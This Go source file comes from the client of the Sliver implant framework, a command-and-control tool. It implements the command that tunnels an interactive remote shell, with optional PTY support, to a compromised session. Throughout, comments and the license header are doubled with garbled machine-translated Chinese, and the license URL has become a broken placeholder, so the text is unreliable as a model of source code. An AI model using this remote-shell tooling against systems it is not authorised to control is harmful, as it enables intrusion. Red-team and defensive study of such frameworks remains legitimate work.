package shell

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox
	Copyright (C) 2019 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	This 程序是免费软件：您可以重新分发它 and/or 修改
	it under the terms of the GNU General Public License as published by
	它根据 GNU General Public License 发布的条款
	the Free Software Foundation, either version 3 of the License, or
	Free Software Foundation，License 的版本 3，或
	(at your option) any later version.
	（由您选择）稍后 version.

	This program is distributed in the hope that it will be useful,
	This 程序被分发，希望它有用，
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	但是WITHOUT ANY WARRANTY；甚至没有默示保证
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
	GNU General Public License for more details.
	GNU General Public License 更多 details.

	You should have received a copy of the GNU General Public License
	You 应已收到 GNU General Public License 的副本
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	与此 program. If 不一起，请参见 <__PH0__
*/

import (
	"bufio"
	"context"
	"io"
	"log"
	"os"

	"github.com/bishopfox/sliver/client/command/settings"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

const (
	windows = "windows"
	darwin  = "darwin"
	linux   = "linux"
)

// ShellCmd - Start an interactive shell on the remote system.
// ShellCmd - Start 远程 system. 上的交互式 shell
func ShellCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	if !settings.IsUserAnAdult(con) {
		return
	}

	shellPath, _ := cmd.Flags().GetString("shell-path")
	noPty, _ := cmd.Flags().GetBool("no-pty")
	if con.ActiveTarget.GetSession().OS != linux && con.ActiveTarget.GetSession().OS != darwin {
		noPty = true // Sliver's PTYs are only supported on linux/darwin
		noPty = true // Sliver 的 PTYs 仅在 linux/darwin 上受支持
	}
	runInteractive(cmd, shellPath, noPty, con)
	con.Println("Shell exited")
}

func runInteractive(cmd *cobra.Command, shellPath string, noPty bool, con *console.SliverClient) {
	con.Println()
	con.PrintInfof("Wait approximately 10 seconds after exit, and press <enter> to continue\n")
	con.PrintInfof("Opening shell tunnel (EOF to exit) ...\n\n")
	session := con.ActiveTarget.GetSession()
	if session == nil {
		return
	}

	// Create an RPC tunnel, then start it before binding the shell to the newly created tunnel
	// Create 一个 RPC 隧道，然后在将 shell 绑定到新创建的隧道之前启动它
	ctxTunnel, cancelTunnel := context.WithCancel(context.Background())

	rpcTunnel, err := con.Rpc.CreateTunnel(ctxTunnel, &sliverpb.Tunnel{
		SessionID: session.ID,
	})
	defer cancelTunnel()
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	log.Printf("Created new tunnel with id: %d, binding to shell ...", rpcTunnel.TunnelID)

	// Start() takes an RPC tunnel and creates a local Reader/Writer tunnel object
	// Start() 采用 RPC 隧道并创建本地 Reader/Writer 隧道对象
	tunnel := core.GetTunnels().Start(rpcTunnel.TunnelID, rpcTunnel.SessionID)

	var rows uint32
	var cols uint32
	if !noPty {
		colsInt, rowsInt, err := term.GetSize(int(os.Stdout.Fd()))
		if err != nil || rowsInt <= 0 || colsInt <= 0 {
			colsInt, rowsInt, err = term.GetSize(int(os.Stdin.Fd()))
		}
		if err == nil && rowsInt > 0 && colsInt > 0 {
			rows = uint32(rowsInt)
			cols = uint32(colsInt)
		}
	}

	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
		Request:   con.ActiveTarget.Request(cmd),
		Path:      shellPath,
		EnablePTY: !noPty,
		Rows:      rows,
		Cols:      cols,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	//
	if shell.Response != nil && shell.Response.Err != "" {
		con.PrintErrorf("Error: %s\n", shell.Response.Err)
		_, err = con.Rpc.CloseTunnel(context.Background(), &sliverpb.Tunnel{
			TunnelID:  tunnel.ID,
			SessionID: session.ID,
		})
		if err != nil {
			con.PrintErrorf("RPC Error: %s\n", err)
		}
		return
	}
	defer tunnel.Close()
	log.Printf("Bound remote shell pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	con.PrintInfof("Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *term.State
	if !noPty {
		oldState, err = term.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			con.PrintErrorf("Failed to save terminal state")
			return
		}
	}

	stopPtyResize := func() {}
	if !noPty {
		stopPtyResize = startPtyResizeWatcher(con, cmd, tunnel.ID)
	}
	defer stopPtyResize()

	log.Printf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		log.Printf("Wrote %d bytes to stdout", n)
		if err != nil {
			con.PrintErrorf("Error writing to stdout: %s", err)
			return
		}
	}()
	log.Printf("Reading from stdin ...")
	n, err := io.Copy(tunnel, newFilterReader(os.Stdin))
	log.Printf("Read %d bytes from stdin", n)
	if err != nil && err != io.EOF {
		con.PrintErrorf("Error reading from stdin: %s\n", err)
	}

	if !noPty {
		log.Printf("Restoring terminal state ...")
		term.Restore(0, oldState)
	}

	log.Printf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()
}
